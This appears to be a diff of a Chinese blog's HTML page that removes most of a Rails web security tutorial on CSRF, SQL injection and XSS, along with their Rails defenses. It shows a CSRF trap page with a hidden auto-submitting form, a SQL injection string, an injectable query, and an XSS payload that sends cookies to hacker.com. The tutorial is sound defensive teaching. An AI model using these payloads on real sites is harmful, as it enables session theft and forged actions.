@@ -226,60 +226,6 @@
 </ul>
 <p>我们在本地分别起两个服务（修改/etc/hosts 将两个域名指向本地，然后通过nginx反向代理），来演示1. www.mubiao.com 为我们要攻击的网站，2. www.hacker.com 为我们自己的网站。假设我们已经猜测出目标网站的某些可用的url，比如：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.mubiao.com/orders</span>.html</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.mubiao.com/ancient</span><span class="regexp">/articles</span></div></pre></td></tr></table></figure></p>
 <p>然后我们在自己的网站上做一些陷阱，在某个页面加入<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">'http://www.mubiao.com/orders.html'</span> &gt;</div><div class="line">&lt;a href=<span class="string">"#"</span> onclick=<span class="string">"</span></div><div class="line"><span class="string">  var f = document.createElement('form');</span></div><div class="line"><span class="string">  f.style.display = 'none';</span></div><div class="line"><span class="string">  this.parentNode.appendChild(f);</span></div><div class="line"><span class="string">  f.method = 'post';</span></div><div class="line"><span class="string">  f.action = 'http://www.mubiao.com/ancient/articles';</span></div><div class="line"><span class="string">  f.submit();</span></div><div class="line"><span class="string">  return false;"</span>&gt;点我啊&lt;<span class="regexp">/a&gt;</span></div></pre></td></tr></table></figure></p>
-<p>小陈是目标网站的管理人员，并且已经在目标网站登录了管理员账号，hacker将hacker.com通过某种方式发送给小陈，小陈访问，并且点击会发生什么呢，浏览器会在发送请求的时候带上目标网站的cookie，目标网站会认为这个会话是有效的。所以hacker只要知道目标网站的请求地址，并诱导小陈点击，即可借小陈之手，完成所有想要的操作。</p>
-<ul>
-<li><p>如何防范？</p>
-<blockquote>
-<p>首先，根据 W3C 的要求，应该适当地使用 GET 和 POST HTTP 方法。其次，在非 GET 请求中使用安全令牌（security token）可以防止应用受到 CSRF 攻击<br>使用 GET HTTP 方法的情形：<br>当交互更像是在询问时，例如查询、读取、查找等安全操作。<br>使用 POST HTTP 方法的情形：<br>当交互更像是在执行命令时；<br>当交互改变了资源的状态并且这种变化能够被用户察觉时，例如订阅某项服务；<br>当用户需要对交互结果负责时。</p>
-</blockquote>
-</li>
-<li><p>原理<br>那么rails是如何实现安全令牌的呢？<br>view添加(ajax提交) form表单会自动生成authenticity_token</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%= csrf_meta_tags %&gt;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>congroller中添加<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">protect_from_forgery <span class="symbol">with:</span> <span class="symbol">:exception</span></div></pre></td></tr></table></figure></p>
-<p>csrf_meta_tags helper方法会在页面生成token，protect_from_forgery会添加一个before_action来校验前台传过来的token,具体实现之前秦阳有讲过，就不细说了，放一张流程图。<br><img src="/img/rails_csrf_encrypt.png" alt=""></p>
-<h3 id="注入攻击">注入攻击</h3><blockquote>
-<p>注入这种攻击方式，会把恶意代码或参数写入 Web 应用，以便在应用的安全上下文中执行。注入攻击最著名的例子是跨站脚本（XSS）和 SQL 注入攻击。</p>
-</blockquote>
-<h4 id="SQL注入">SQL注入</h4><ul>
-<li>举例</li>
-</ul>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Product.where(<span class="string">"xxx_id = 1 AND status = '<span class="subst">#&#123;params[<span class="symbol">:status</span>]&#125;</span>' AND xxx='<span class="subst">#&#123;params[<span class="symbol">:aaa</span>]&#125;</span>'"</span>)</div></pre></td></tr></table></figure>
-<p>如果用户输入：’ OR ‘1’=’1，会跳过校验。</p>
-<ul>
-<li>如何防范<br>推荐的写法为<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Product.where(<span class="symbol">xxx_id:</span> <span class="number">1</span>).where(<span class="string">"status = ? and xx = ?"</span>,params[<span class="symbol">:status</span>],params[<span class="symbol">:aaa</span>])</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>Ruby on Rails 内置了针对特殊 SQL 字符的过滤器，用于转义 ‘、”、NULL 和换行符。当我们使用 Model.find(id) 和 Model.find_by_something(something) 方法时，Rails 会自动应用这个过滤器。遇到需要在 SQL 中使用外部字符串的情况时，请养成考虑安全问题的习惯。</p>
-<ul>
-<li>原理</li>
-</ul>
-<p>那rails是如何实现转义的呢，通过查找源码发现，最终调用的是Mysql提供的C接口,接口名称为mysql_real_escape_string<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#mysql2-0.3.18/ext/mysql2/client.c</span></div><div class="line"></div><div class="line">rb_define_singleton_method(cMysql2Client, <span class="string">"escape"</span>, rb_mysql_client_escape, <span class="number">1</span>);</div></pre></td></tr></table></figure></p>
-<p>active_record提供了Sanitization类，可以手动调用转义<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Product::sanitize(string)</div></pre></td></tr></table></figure></p>
-<h4 id="跨站脚本（XSS）">跨站脚本（XSS）</h4><ul>
-<li><p>简介</p>
-<blockquote>
-<p>对 Web 应用而言，XSS 是影响范围最广、破坏性最大的安全漏洞。这种恶意攻击方式会在客户端注入可执行代码。</p>
-</blockquote>
-</li>
-<li><p>举例<br>例如，在留言或者文章中输入：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;document.write(<span class="string">'&lt;img src="http://www.hacker.com/'</span> + document.cookie + <span class="string">'"&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>当用户在浏览目标网站的时候，会向hacker.com发送自己的cookie，导致cookie泄露。</p>
-<ul>
-<li>防范：<blockquote>
-<p>尤其对于 XSS，重要的是使用白名单而不是黑名单过滤输入。白名单过滤规定允许输入的值，反之，黑名单过滤规定不允许输入的值。经验告诉我们，黑名单永远做不到万无一失。</p>
-</blockquote>
-</li>
-</ul>
-<p>rails提供了sanitize方法可以过滤掉有问题的标签</p>
-<ul>
-<li>原理</li>
-</ul>
-<h3 id="参考文档">参考文档</h3><p><a href="https://ruby-china.org/topics/35199" target="_blank" rel="external">深入 Rails 中的 CSRF Protection</a><br><a href="https://ruby-china.github.io/rails-guides/security.html" target="_blank" rel="external">Ruby on Rails 安全指南</a><br><a href="https://blog.csdn.net/qq_21111579/article/details/52051913" target="_blank" rel="external">C语言Mysql接口</a></p>
-
       
     </div>
     
@@ -291,6 +237,10 @@
 
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2018/10/26/web安全/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
